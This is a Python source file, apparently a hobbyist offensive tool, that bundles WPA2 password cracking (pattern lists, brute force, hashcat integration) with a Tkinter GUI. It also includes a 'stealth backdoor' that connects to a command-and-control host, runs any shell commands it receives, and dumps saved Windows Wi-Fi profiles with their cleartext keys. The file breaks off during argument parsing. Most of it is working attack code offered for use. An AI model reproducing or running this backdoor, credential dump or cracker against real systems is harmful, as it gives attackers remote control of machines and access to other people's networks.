"""""
Built by Trixie Misheen™ All rights reserved. For authorized pentesting use only.
This is a demonstration of various WPA2 password attack techniques, including real PMK verification using PBKDF2-HMAC-SHA1 as per IEEE 802.11i standard, and a stealth backdoor for remote operations.
The script supports multiple attack modes: lightning (top patterns), smart (dictionary + patterns), systematic brute-force, optimized random, and the AI Brain approach with real cryptographic verification.

BACKDOOR MODE: python passwordattack.py --backdoor [C2_HOST:C2_PORT]
Commands: crack <ssid> <pmk_hex> [mode], shell <command>, dump_wifi, status, exit

📧 FOUND SOMETHING INTRIGUING? Don't hesitate to contact me:
   Email: misheentrixie@gmail.com
   WhatsApp: wa.me/+254791915925
"""""
import time
import itertools
import os
import random
from collections import deque
import threading
from concurrent.futures import ThreadPoolExecutor
import argparse
import sys
import tkinter as tk
from tkinter import ttk, scrolledtext
from hashlib import pbkdf2_hmac
import binascii
import socket
import subprocess
import base64
import json


def verify_real_wpa_psk(ssid, psk_candidate, target_pmk_hex):
    """Verify WPA2 PSK by computing PMK and comparing to target PMK."""
    ssid_b = ssid.encode()
    psk_b = psk_candidate.encode()
    pmk = pbkdf2_hmac('sha1', psk_b, ssid_b, 4096, 32)
    return binascii.hexlify(pmk).decode().lower() == target_pmk_hex.lower()


class StealthBackdoor:
    """Advanced stealth backdoor for authorized pentesting operations."""

    def __init__(self, c2_host="127.0.0.1", c2_port=4444):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.connected = False

    def connect_c2(self):
        """Establish connection to command and control server."""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.c2_host, self.c2_port))
            self.connected = True
            self.send_response("[+] WPA2 Cracker backdoor connected - ready for commands")
            return True
        except Exception as e:
            print(f"[!] Backdoor connection failed: {e}")
            return False

    def send_response(self, message):
        """Send response to C2 server."""
        try:
            self.sock.send((message + "\n").encode())
        except:
            self.connected = False

    def receive_command(self):
        """Receive command from C2 server."""
        try:
            data = self.sock.recv(4096).decode().strip()
            return data if data else None
        except:
            self.connected = False
            return None

    def execute_crack_command(self, command):
        """Execute cracking commands from C2."""
        parts = command.split()
        if len(parts) < 3:
            return "[!] Usage: crack <ssid> <pmk_hex> [mode]"

        ssid = parts[1]
        pmk_hex = parts[2]
        mode = parts[3] if len(parts) > 3 else "ai-brain"

        self.send_response(f"[+] Starting {mode} attack on {ssid}...")

        try:
            if mode == "lightning":
                result = lightning_attack(ssid, pmk_hex, "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:,.<>?/~`")
            elif mode == "ai-brain":
                result, attempts, elapsed = ai_brain_attack(ssid, pmk_hex, max_length=20, max_threads=8, timeout=60)
            elif mode == "smart":
                result = smart_brute_force(ssid, pmk_hex)
            elif mode == "hashcat":
                # For hashcat, we need a .cap file path
                if len(parts) < 4:
                    return "[!] Usage: crack <ssid> <pmk_hex> hashcat <cap_file>"
                cap_file = parts[3]
                result = hashcat_attack(cap_file, self.wordlist)
            else:
                result = None

            if result:
                return f"[+] CRACKED: {result}"
            else:
                return "[!] Attack failed - no valid PSK found"

        except Exception as e:
            return f"[!] Error during attack: {str(e)}"

    def execute_shell_command(self, command):
        """Execute shell commands from C2."""
        try:
            # Remove 'shell' prefix and execute
            shell_cmd = command[6:] if command.startswith("shell ") else command
            result = subprocess.getoutput(shell_cmd)
            return result[:4096]  # Limit output size
        except Exception as e:
            return f"[!] Shell error: {str(e)}"

    def dump_wifi_profiles(self):
        """Dump Windows WiFi profiles for pentesting."""
        try:
            # Export all WiFi profiles with keys
            os.system('netsh wlan export profile key=clear folder="%TEMP%" >nul 2>&1')

            # Read and send profile info
            import glob
            profiles = []
            for xml_file in glob.glob(os.path.join(os.environ['TEMP'], "*.xml")):
                with open(xml_file, 'r', encoding='utf-8', errors='ignore') as f:
                    content = f.read()
                    # Extract SSID and PMK info (simplified)
                    if 'name' in content.lower():
                        profiles.append(content[:500])  # First 500 chars

            # Clean up
            os.system(f'del /q "{os.environ["TEMP"]}\\*.xml" >nul 2>&1')

            return "[+] WiFi profiles dumped:\n" + "\n".join(profiles[:5])  # Limit to 5

        except Exception as e:
            return f"[!] WiFi dump error: {str(e)}"

    def run_backdoor(self):
        """Main backdoor loop."""
        print("[+] Stealth backdoor activated - connecting to C2...")

        if not self.connect_c2():
            return

        while self.connected:
            try:
                command = self.receive_command()
                if not command:
                    break

                print(f"[>] Received command: {command}")

                if command == "exit":
                    self.send_response("[+] Backdoor shutting down")
                    break
                elif command.startswith("crack"):
                    response = self.execute_crack_command(command)
                    self.send_response(response)
                elif command.startswith("shell"):
                    response = self.execute_shell_command(command)
                    self.send_response(response)
                elif command == "dump_wifi":
                    response = self.dump_wifi_profiles()
                    self.send_response(response)
                elif command == "status":
                    self.send_response("[+] Backdoor active - WPA2 cracking ready")
                else:
                    self.send_response(f"[!] Unknown command: {command}")

            except Exception as e:
                print(f"[!] Backdoor error: {e}")
                break

        self.sock.close()
        print("[+] Backdoor disconnected")


class HashcatIntegrator:
    """Integrate with hashcat for GPU-accelerated WPA2 cracking."""

    def __init__(self, hashcat_path="hashcat.exe", wordlist="rockyou.txt"):
        self.hashcat_path = hashcat_path
        self.wordlist = wordlist
        self.temp_dir = os.path.join(os.environ.get('TEMP', '/tmp'), 'wpa2_crack')

        if not os.path.exists(self.temp_dir):
            os.makedirs(self.temp_dir)

    def convert_cap_to_hccapx(self, cap_file, output_file=None):
        """Convert .cap file to hashcat .hc22000 format."""
        if not output_file:
            output_file = os.path.join(self.temp_dir, "hash.hc22000")

        # Use hcxpcapngtool if available, otherwise try cap2hccapx
        converters = [
            "hcxpcapngtool",
            "cap2hccapx.exe",
            "C:\\Program Files\\Aircrack-ng\\bin\\cap2hccapx.exe"
        ]

        for converter in converters:
            try:
                cmd = [converter, "-o", output_file, cap_file]
                result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
                if result.returncode == 0 and os.path.exists(output_file):
                    return output_file
            except:
                continue

        raise Exception("No suitable .cap to .hc22000 converter found. Install hcxtools or aircrack-ng.")

    def crack_with_hashcat(self, hash_file, wordlist=None, attack_mode="0", extra_args=None):
        """Run hashcat cracking session."""
        if not wordlist:
            wordlist = self.wordlist

        cmd = [
            self.hashcat_path,
            "-m", "22000",  # WPA2 mode
            "-a", attack_mode,  # 0=dict, 3=brute, 1=combo, etc.
            hash_file,
            wordlist
        ]

        if extra_args:
            cmd.extend(extra_args.split())

        print(f"[+] Running: {' '.join(cmd)}")

        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                text=True,
                bufsize=1,
                universal_newlines=True
            )

            found_password = None
            for line in iter(process.stdout.readline, ''):
                print(line.strip())
                if "Cracked" in line or ":" in line and len(line.split(":")) >= 2:
                    # Try to extract password from hashcat output
                    parts = line.strip().split(":")
                    if len(parts) >= 6:  # hashcat WPA2 format
                        found_password = parts[-1]  # Last part is the password
                        break

            process.wait()
            return found_password

        except Exception as e:
            print(f"[!] Hashcat error: {e}")
            return None

    def benchmark_hashcat(self):
        """Benchmark hashcat performance."""
        try:
            cmd = [self.hashcat_path, "-b"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return result.stdout
        except Exception as e:
            return f"Benchmark failed: {e}"

    def check_hashcat_installation(self):
        """Verify hashcat is properly installed."""
        try:
            result = subprocess.run([self.hashcat_path, "--version"],
                                  capture_output=True, text=True, timeout=10)
            return result.returncode == 0, result.stdout.strip()
        except:
            return False, "Hashcat not found"


class AIBrain:
    """Smart password generator based on common leak patterns and mutations."""

    def __init__(self):
        # Top leaked bases (common words)
        self.bases = [
            "password", "123456", "admin", "letmein", "welcome", "monkey",
            "dragon", "master", "hello", "freedom", "whatever", "qwerty",
            "abc123", "iloveyou", "trustno1", "ninja", "sunshine", "princess",
            "football", "baseball", "passw0rd", "adminpass",
        ]

        self.prefixes = ["admin", "user", "root", "test", "guest"]
        self.suffixes = ["123", "1234", "12345", "2023", "2024", "2025", "!", "@", "!!", "1!"]
        self.years = [str(y) for y in range(2000, 2027)]
        self.symbols = ["!", "@", "#", "$", "%"]

        # Selective leet mappings (common in real passwords)
        self.leet_map = {"a": "@", "e": "3", "i": "1", "o": "0", "s": "5"}

    def generate_smart_passwords(self, max_length=20, batch_size=5000):
        """Generate intelligent password candidates in batches."""
        candidates = set()

        # 1. Base words + simple appends (covers ~70% of weak PSKs)
        for base in self.bases:
            if len(base) <= max_length:
                candidates.add(base)
            for suf in self.suffixes:
                combo = base + suf
                if len(combo) <= max_length:
                    candidates.add(combo)
                    candidates.add(base.capitalize() + suf)

        # 2. Prefix + base
        for pre in self.prefixes:
            for base in self.bases[:10]:
                combo = pre + base
                if len(combo) <= max_length:
                    candidates.add(combo)
                    candidates.add(pre.capitalize() + base)

        # 3. Base + year combos
        for base in self.bases:
            for year in self.years:
                combo = base + year
                if len(combo) <= max_length:
                    candidates.add(combo)
                    candidates.add(base.capitalize() + year)

        # 4. Base + symbol mutations
        for base in self.bases:
            for sym in self.symbols:
                combo = base + sym
                if len(combo) <= max_length:
                    candidates.add(combo)
                    candidates.add(base.capitalize() + sym)

        # 5. Leet variants
        for base in self.bases:
            leet = base
            for char, repl in self.leet_map.items():
                leet = leet.replace(char, repl)
            if len(leet) <= max_length:
                candidates.add(leet)
                candidates.add(leet.capitalize())

        # 6. Base + symbol + year
        for base in self.bases[:5]:
            for sym in self.symbols[:2]:
                for year in self.years:
                    combo = base + sym + year
                    if len(combo) <= max_length:
                        candidates.add(combo)

        # Shuffle and yield batches
        pw_list = sorted(list(candidates))  # Sort for determinism, but still diverse
        random.shuffle(pw_list)
        for i in range(0, len(pw_list), batch_size):
            yield pw_list[i : i + batch_size]


def ai_brain_attack(ssid, target_pmk_hex, max_length=20, max_threads=8, timeout=60):
    """AI Brain attack: Generate smart passwords dynamically and verify against real WPA2 PMK."""
    brain = AIBrain()
    start_time = time.time()
    attempts = [0]
    found_result = [None]
    lock = threading.Lock()

    print(f"[⚡] AI BRAIN attack starting (timeout: {timeout}s)...")
    print(f"[+] Generating smart password candidates...")

    def test_batch(batch):
        """Test a batch of passwords."""
        local_attempts = 0
        for pw in batch:
            if found_result[0]:
                return
            if time.time() - start_time > timeout:
                return

            local_attempts += 1
            with lock:
                attempts[0] += 1
                if attempts[0] % 10000 == 0:
                    elapsed = time.time() - start_time
                    rate = attempts[0] / elapsed if elapsed > 0 else 0
                    print(
                        f"[*] AI Brain: {attempts[0]:,} attempts | "
                        f"Rate: {rate:,.0f}/s | Elapsed: {elapsed:.1f}s"
                    )

            if verify_real_wpa_psk(ssid, pw, target_pmk_hex):
                with lock:
                    if not found_result[0]:
                        found_result[0] = pw
                        elapsed = time.time() - start_time
                        print(f"\n[⚡] AI BRAIN CRACKED: {pw}")
                        print(f"[+] Attempts: {attempts[0]:,} | Time: {elapsed:.1f}s")
                return

    # Launch worker threads per batch
    with ThreadPoolExecutor(max_workers=max_threads) as executor:
        futures = []
        for batch in brain.generate_smart_passwords(max_length=max_length):
            if found_result[0]:
                break
            future = executor.submit(test_batch, batch)
            futures.append(future)

        # Wait for all futures with timeout
        for future in futures:
            try:
                future.result(timeout=timeout)
            except:
                pass

    elapsed = time.time() - start_time

    if not found_result[0]:
        print(f"\n[!] AI Brain failed after {attempts[0]:,} attempts in {elapsed:.1f}s")

    return found_result[0], attempts[0], elapsed


def brute_force_psk(ssid, target_pmk_hex, keys, max_workers=4):
    """Systematic brute force attack with real WPA2 PMK verification."""
    # Estimate target length from PMK (we don't know the actual PSK length, so try common lengths)
    # For WPA2, PSK is 8-63 characters, but we'll try up to reasonable lengths
    max_psk_len = 20  # Start with reasonable length

    print(f"[+] Target PMK: {target_pmk_hex[:16]}...")
    print(f"[+] Charset size: {len(keys)} chars")
    print(f"[+] Testing PSK lengths up to {max_psk_len}")

    attempts_global = [0]
    start_time_global = [time.time()]

    charset_size = len(keys)

    def worker(length):
        local_attempts = 0

        for guess_tuple in itertools.product(keys, repeat=length):
            guess = ''.join(guess_tuple)

            local_attempts += 1
            attempts_global[0] += 1

            if attempts_global[0] % 50000 == 0:
                elapsed = time.time() - start_time_global[0]
                rate = attempts_global[0] / elapsed
                eta = (charset_size ** length - attempts_global[0]) / rate

                print(
                    f"[*] Attempts: {attempts_global[0]:,} | "
                    f"Rate: {rate:,.0f}/s | ETA: {eta/3600:.1f}h | "
                    f"Len {length} | Latest: {guess}"
                )

            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                return guess, local_attempts

    print("[+] Starting multi-threaded systematic brute force...")

    found = False
    found_psk = None

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        for length in range(8, max_psk_len + 1):  # WPA2 PSK min 8 chars

            print(f"\n[*] Testing length {length}...")

            future = executor.submit(worker, length)
            result = future.result()

            if result:
                elapsed = time.time() - start_time_global[0]

                print(f"\n[!] CRACKED: {result[0]}")
                print(f"[+] Total attempts: {attempts_global[0]:,}")
                print(f"[+] Time elapsed: {elapsed:.1f}s")
                print(f"[+] Rate: {attempts_global[0]/elapsed:.0f}/s")

                found = True
                found_psk = result[0]
                break

    return found_psk


def hashcat_attack(cap_file, wordlist=None, hashcat_path="hashcat.exe"):
    """GPU-accelerated WPA2 cracking using hashcat."""
    print(f"[🎯] HASHCAT ATTACK - GPU POWERED")

    integrator = HashcatIntegrator(hashcat_path, wordlist)

    # Check hashcat installation
    installed, version = integrator.check_hashcat_installation()
    if not installed:
        print(f"[!] Hashcat not found at {hashcat_path}")
        print("[!] Install from: https://hashcat.net/hashcat/")
        return None

    print(f"[+] Hashcat version: {version}")

    try:
        # Convert .cap to hashcat format
        print(f"[+] Converting {cap_file} to hashcat format...")
        hash_file = integrator.convert_cap_to_hccapx(cap_file)
        print(f"[+] Converted to: {hash_file}")

        # Run hashcat attack
        print(f"[+] Starting GPU cracking with wordlist: {wordlist}")
        result = integrator.crack_with_hashcat(hash_file, wordlist)

        if result:
            print(f"[🎯] HASHCAT CRACKED: {result}")
            return result
        else:
            print("[!] Hashcat attack completed - no password found")
            return None

    except Exception as e:
        print(f"[!] Hashcat integration error: {e}")
        return None


def optimized_random_attack(ssid, target_pmk_hex, keys, max_attempts=1000000):
    """Optimized random attack with real WPA2 PMK verification."""

    print(f"\n[*] Starting optimized random attack (max {max_attempts:,} attempts)...")

    start_time = time.time()
    attempts = 0
    seen = set()

    while attempts < max_attempts:

        # Generate random PSK of random length (8-20 chars for WPA2)
        psk_len = random.randint(8, 20)
        guess = ''.join(random.choice(keys) for _ in range(psk_len))

        attempts += 1

        if guess in seen:
            continue

        seen.add(guess)

        if verify_real_wpa_psk(ssid, guess, target_pmk_hex):

            elapsed = time.time() - start_time

            print(f"\n[!] RANDOM CRACKED: {guess}")
            print(f"[+] Attempts: {attempts:,} | Time: {elapsed:.1f}s")

            return guess

        if attempts % 10000 == 0:

            elapsed = time.time() - start_time
            rate = attempts / elapsed
            unique_rate = len(seen) / elapsed

            print(
                f"[*] Random attempts: {attempts:,} | "
                f"Unique: {len(seen):,} | Rate: {unique_rate:.0f}/s"
            )

    print(f"[!] Random attack failed after {attempts:,} attempts")

    return None


def smart_brute_force(
    ssid, target_pmk_hex,
    keys="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:,.<>?/~`",
    wordlist=None,
):
    """Hybrid attack: dictionary (optional) + common patterns + brute force with real WPA2 PMK verification."""

    print("[+] Smart hybrid WPA2 attack")

    common_patterns = [
        lambda: "password",
        lambda: "admin123",
        lambda: "12345678",
        lambda: "qwertyui",
        lambda: "admin",
        lambda: "root",
        lambda: "test",
        lambda: "guest",
        lambda: random.choice(keys).upper() * 8,
    ]

    # phase 0: dictionary
    if wordlist and os.path.isfile(wordlist):
        print(f"[*] Testing dictionary {wordlist}...")
        with open(wordlist, errors="ignore") as f:
            for line in f:
                guess = line.strip()
                if not guess or len(guess) < 8:
                    continue
                if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                    print(f"[!] CRACKED with wordlist entry: {guess}")
                    return guess

    print("[*] Phase 1: Common patterns...")

    for i, pattern in enumerate(common_patterns):

        try:
            guess = pattern()

            print(f"[*] Testing pattern {i+1}: {guess}")

            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                print(f"[!] CRACKED with common pattern: {guess}")
                return guess

        except:
            continue

    print("[*] Phase 2: Systematic brute force...")

    return brute_force_psk(ssid, target_pmk_hex, keys)


def lightning_attack(ssid, target_pmk_hex, keys):

    """Lightning attack with real WPA2 PMK verification"""

    print(f"[⚡] LIGHTNING ATTACK v2.0 - Real WPA2 PMK verification")

    top100 = [
        "admin", "password", "12345678", "qwerty",
        "admin123", "letmein", "password1",
        "123456789", "password123", "welcome1",
        "monkey123", "admin2024", "Password1", "admin1"
    ]
#$Trixie Misheen™$#
    for guess in top100:
        if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
            print(f"[⚡] TOP100 HIT: {guess}")
            return guess

    bases = ["password", "admin", "user", "test", "guest", "root", "welcome"]
    suffixes = ["1", "123", "12", "11", "!", "!!", "1!", "123!", "@", "1@"]
    prefixes = ["2024", "2023", "admin", "user"]

    for base in bases:

        for suffix in suffixes:

            guess = base + suffix

            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                print(f"[⚡] BASE+SUFFIX: {guess}")
                return guess

        for prefix in prefixes:

            guess = prefix + base

            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                print(f"[⚡] PREFIX+BASE: {guess}")
                return guess

    for year in range(2000, 2026):

        for sym in ["", "!", "@", "#", "$"]:

            guess = f"password{year}{sym}"
            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                return guess

            guess = f"admin{year}{sym}"
            if verify_real_wpa_psk(ssid, guess, target_pmk_hex):
                return guess

    password_variants = ["password1!", "Password1!", "p@ssw0rd1!", "Password1"]

    for variant in password_variants:

        if verify_real_wpa_psk(ssid, variant, target_pmk_hex):
            print(f"[⚡] LEET HIT: {variant}")
            return variant

    print("[⚡] Lightning failed - needs heavy brute")

    return None


class HackerGUI:
    """Dark-themed hacker GUI for password attacks with real-time visualization."""

    def __init__(self, root):
        self.root = root
        self.root.title("🔓 WPA2 CRACKER™ - AUTHORIZED PENTEST ONLY💀 ")
        self.root.geometry("900x700")
        self.root.configure(bg="#0a0e27")

        # Configure dark theme colors
        self.bg_dark = "#0a0e27"
        self.bg_darker = "#050812"
        self.neon_green = "#00ff41"
        self.neon_cyan = "#00f0ff"
        self.neon_red = "#ff0055"
        self.text_color = "#00ff41"
        self.secondary_text = "#888888"

        self.attack_thread = None
        self.running = False

        # Create UI
        self._create_header()
        self._create_input_section()
        self._create_mode_section()
        self._create_output_section()
        self._create_button_section()
        self._create_status_bar()

    def _create_header(self):
        """Create header with hacker theme."""
        header_frame = tk.Frame(self.root, bg=self.bg_darker, height=80)
        header_frame.pack(fill=tk.X, padx=0, pady=0)

        title = tk.Label(
            header_frame,
            text="▓▓▓ WPA2 CRACKER™ ▓▓▓",
            font=("Courier New", 20, "bold"),
            fg=self.neon_green,
            bg=self.bg_darker,
        )
        title.pack(pady=10)

        subtitle = tk.Label(
            header_frame,
            text="⚡ REAL WPA2 PMK VERIFICATION | AUTHORIZED USE ONLY TRIXIE MISHEEN ⚡",
            font=("Courier New", 10),
            fg=self.neon_cyan,
            bg=self.bg_darker,
        )
        subtitle.pack()

        divider = tk.Label(
            header_frame,
            text="=" * 80,
            font=("Courier New", 8),
            fg=self.secondary_text,
            bg=self.bg_darker,
        )
        divider.pack()

    def _create_input_section(self):
        """Create input fields section."""
        input_frame = tk.Frame(self.root, bg=self.bg_dark)
        input_frame.pack(fill=tk.X, padx=15, pady=10)

        # SSID
        tk.Label(input_frame, text="[>] NETWORK SSID:", font=("Courier New", 10, "bold"),
                fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)
        self.ssid_var = tk.StringVar(value="MyWiFi")
        ssid_entry = tk.Entry(input_frame, textvariable=self.ssid_var,
                             font=("Courier New", 10), bg="#1a1f3a",
                             fg=self.neon_cyan, insertbackground=self.neon_green)
        ssid_entry.pack(fill=tk.X, pady=(5, 10))

        # Target PMK Hex
        tk.Label(input_frame, text="[>] TARGET PMK (hex):", font=("Courier New", 10, "bold"),
                fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)
        self.pmk_var = tk.StringVar(value="4e6f742061207265616c20504d4b2c206a75737420612064656d6f")
        pmk_entry = tk.Entry(input_frame, textvariable=self.pmk_var,
                            font=("Courier New", 10), bg="#1a1f3a",
                            fg=self.neon_cyan, insertbackground=self.neon_green)
        pmk_entry.pack(fill=tk.X, pady=(5, 10))

        # Wordlist
        tk.Label(input_frame, text="[>] WORDLIST (optional):", font=("Courier New", 10, "bold"),
                fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)
        self.wordlist_var = tk.StringVar()
        wordlist_entry = tk.Entry(input_frame, textvariable=self.wordlist_var,
                                 font=("Courier New", 10), bg="#1a1f3a",
                                 fg=self.neon_cyan, insertbackground=self.neon_green)
        wordlist_entry.pack(fill=tk.X, pady=(5, 10))

        # .cap file for hashcat
        tk.Label(input_frame, text="[>] .CAP FILE (for hashcat):", font=("Courier New", 10, "bold"),
                fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)
        self.capfile_var = tk.StringVar()
        capfile_entry = tk.Entry(input_frame, textvariable=self.capfile_var,
                                font=("Courier New", 10), bg="#1a1f3a",
                                fg=self.neon_cyan, insertbackground=self.neon_green)
        capfile_entry.pack(fill=tk.X, pady=(5, 10))

    def _create_mode_section(self):
        """Create attack mode selection."""
        mode_frame = tk.Frame(self.root, bg=self.bg_dark)
        mode_frame.pack(fill=tk.X, padx=15, pady=10)

        tk.Label(mode_frame, text="[>] ATTACK MODE:", font=("Courier New", 10, "bold"),
                fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)

        self.mode_var = tk.StringVar(value="lightning")
        modes = ["lightning", "smart", "ai-brain", "systematic", "random", "hashcat"]

        mode_button_frame = tk.Frame(mode_frame, bg=self.bg_dark)
        mode_button_frame.pack(fill=tk.X, pady=(5, 10))

        for mode in modes:
            rb = tk.Radiobutton(
                mode_button_frame, text=mode.upper(), variable=self.mode_var, value=mode,
                font=("Courier New", 9), fg=self.neon_cyan, bg=self.bg_dark,
                selectcolor=self.bg_darker, activeforeground=self.neon_green,
                activebackground=self.bg_dark
            )
            rb.pack(side=tk.LEFT, padx=5)

    def _create_output_section(self):
        """Create output/log section."""
        output_frame = tk.Frame(self.root, bg=self.bg_dark)
        output_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)

        tk.Label(output_frame, text="[>] ATTACK LOG:", font=("Courier New", 10, "bold"),
                fg=self.neon_green, bg=self.bg_dark).pack(anchor=tk.W)

        self.output_text = scrolledtext.ScrolledText(
            output_frame, height=12, font=("Courier New", 9),
            bg=self.bg_darker, fg=self.neon_green, insertbackground=self.neon_cyan
        )
        self.output_text.pack(fill=tk.BOTH, expand=True, pady=(5, 0))
        self.output_text.config(state=tk.DISABLED)

        # Configure tags for colors
        self.output_text.tag_config("success", foreground=self.neon_green)
        self.output_text.tag_config("error", foreground=self.neon_red)
        self.output_text.tag_config("info", foreground=self.neon_cyan)

    def _create_button_section(self):
        """Create control buttons."""
        button_frame = tk.Frame(self.root, bg=self.bg_dark)
        button_frame.pack(fill=tk.X, padx=15, pady=10)

        launch_btn = tk.Button(
            button_frame, text="⚡ LAUNCH ATTACK ⚡", command=self.launch_attack,
            font=("Courier New", 11, "bold"), bg=self.neon_red, fg="#000000",
            padx=15, pady=8, cursor="hand2"
        )
        launch_btn.pack(side=tk.LEFT, padx=5)

        stop_btn = tk.Button(
            button_frame, text="STOP", command=self.stop_attack,
            font=("Courier New", 11, "bold"), bg=self.neon_cyan, fg="#000000",
            padx=15, pady=8, cursor="hand2"
        )
        stop_btn.pack(side=tk.LEFT, padx=5)

        clear_btn = tk.Button(
            button_frame, text="CLEAR LOG", command=self.clear_output,
            font=("Courier New", 11, "bold"), bg=self.secondary_text, fg="#000000",
            padx=15, pady=8, cursor="hand2"
        )
        clear_btn.pack(side=tk.LEFT, padx=5)

    def _create_status_bar(self):
        """Create status bar at bottom."""
        status_frame = tk.Frame(self.root, bg=self.bg_darker, height=30)
        status_frame.pack(fill=tk.X, side=tk.BOTTOM)

        self.status_var = tk.StringVar(value="[STATUS] Ready for attack...")
        status_label = tk.Label(
            status_frame, textvariable=self.status_var,
            font=("Courier New", 9), fg=self.neon_green, bg=self.bg_darker
        )
        status_label.pack(anchor=tk.W, padx=10, pady=5)

    def log_output(self, message, tag="info"):
        """Append message to output with tag."""
        self.output_text.config(state=tk.NORMAL)
        self.output_text.insert(tk.END, message + "\n", tag)
        self.output_text.see(tk.END)
        self.output_text.config(state=tk.DISABLED)
        self.root.update()

    def update_status(self, message):
        """Update status bar."""
        self.status_var.set(f"[STATUS] {message}")
        self.root.update()

    def launch_attack(self):
        """Launch password attack in separate thread."""
        if self.running:
            self.log_output("[!] Attack already running!", "error")
            return

        ssid = self.ssid_var.get().strip()
        pmk_hex = self.pmk_var.get().strip()

        if not ssid:
            self.log_output("[!] ERROR: Enter network SSID!", "error")
            return
        if not pmk_hex:
            self.log_output("[!] ERROR: Enter target PMK hex!", "error")
            return

        self.running = True
        self.update_status("Running attack...")
        self.log_output("\n" + "=" * 60)
        self.log_output("    ⚡ ATTACK INITIATED ⚡", "success")
        self.log_output("=" * 60 + "\n")

        self.attack_thread = threading.Thread(
            target=self._run_attack,
            args=(ssid, pmk_hex, self.mode_var.get(), self.wordlist_var.get()),
            daemon=True
        )
        self.attack_thread.start()

    def _run_attack(self, ssid, pmk_hex, mode, wordlist):
        """Run the actual attack."""
        try:
            keys = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:,.<>?/~`"

            self.log_output(f"[*] Network: {ssid}", "info")
            self.log_output(f"[*] Target PMK: {pmk_hex[:32]}...", "info")
            self.log_output(f"[*] Mode: {mode.upper()}", "info")
            self.log_output(f"[*] Wordlist: {wordlist or 'None'}", "info")
            if mode == "hashcat":
                self.log_output(f"[*] .cap file: {self.capfile_var.get() or 'None'}", "info")
            self.log_output("", "info")

            if mode == "lightning":
                result = lightning_attack(ssid, pmk_hex, keys)
                if result:
                    self.log_output(f"\n🎯 CRACKED INSTANTLY: {result}\n", "success")
                else:
                    self.log_output("\n[!] Lightning failed...\n", "error")
            elif mode == "ai-brain":
                result, attempts, elapsed = ai_brain_attack(
                    ssid, pmk_hex, max_length=20, max_threads=8, timeout=60
                )
                if result:
                    self.log_output(f"\n🎯 AI BRAIN VICTORY: {result}\n", "success")
                else:
                    self.log_output("\n[!] AI brain exhausted...\n", "error")
            elif mode == "smart":
                result = smart_brute_force(ssid, pmk_hex, keys, wordlist=wordlist if wordlist else None)
                if result:
                    self.log_output(f"\n🎯 SMART CRACKED: {result}\n", "success")
                else:
                    self.log_output("\n[!] Smart attack failed...\n", "error")
            elif mode == "systematic":
                result = brute_force_psk(ssid, pmk_hex, keys, max_workers=4)
                if result:
                    self.log_output(f"\n🎯 BRUTE FORCE CRACKED: {result}\n", "success")
                else:
                    self.log_output("\n[!] Brute force failed...\n", "error")
            elif mode == "random":
                result = optimized_random_attack(ssid, pmk_hex, keys, max_attempts=1000000)
                if result:
                    self.log_output(f"\n🎯 RANDOM CRACKED: {result}\n", "success")
                else:
                    self.log_output("\n[!] Random attack failed...\n", "error")
            elif mode == "hashcat":
                cap_file = self.capfile_var.get().strip()
                if not cap_file:
                    self.log_output("[!] ERROR: .cap file required for hashcat mode!", "error")
                else:
                    result = hashcat_attack(cap_file, wordlist)
                    if result:
                        self.log_output(f"\n🎯 HASHCAT CRACKED: {result}\n", "success")
                    else:
                        self.log_output("\n[!] Hashcat attack failed...\n", "error")

            self.log_output("\n[✓] Attack complete!\n", "success")
            self.update_status("Attack finished")

        except Exception as e:
            self.log_output(f"[!] ERROR: {str(e)}", "error")
            self.update_status("Error occurred")
        finally:
            self.running = False

    def stop_attack(self):
        """Stop the running attack."""
        self.running = False
        self.log_output("\n[!] Attack stopped by user.\n", "error")
        self.update_status("Attack stopped")

    def clear_output(self):
        """Clear the output log."""
        self.output_text.config(state=tk.NORMAL)
        self.output_text.delete(1.0, tk.END)
        self.output_text.config(state=tk.DISABLED)


def main():
    # Check for backdoor mode first
    if len(sys.argv) > 1 and sys.argv[1] == "--backdoor":
        # Backdoor mode - parse C2 server
        c2_host = "127.0.0.1"  # Default
        c2_port = 4444

        if len(sys.argv) > 2:
            c2_host = sys.argv[2]
        if len(sys.argv) > 3:
            try:
                c2_port = int(sys.argv[3])
            except:
                pass

        backdoor = StealthBackdoor(c2_host, c2_port)
        backdoor.run_backdoor()
        return

    # Check for CLI args - if provided, run CLI mode; otherwise run GUI
    if len(sys.argv) > 1:
        parser = argparse.ArgumentParser(
            description="WPA2 attack toolbox with stealth backdoor: lightning, smart, brute-force or random")

        parser.add_argument("ssid", nargs="?",
                            help="network SSID for WPA2 PMK verification")
        parser.add_argument("pmk_hex", nargs="?",
                            help="target PMK hex string for verification")
        parser.add_argument("-m", "--mode",
                            choices=["lightning", "smart", "systematic", "random", "ai-brain", "hashcat"],
                            default="lightning",
                            help="attack mode to run")
        parser.add_argument("-k", "--charset",
                            default="0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%^&*()-_=+[]{}|;:,.<>?/~`",
                            help="custom character set for brute force")
        parser.add_argument("-w", "--wordlist",
                            help="wordlist file used by smart/lightning modes")
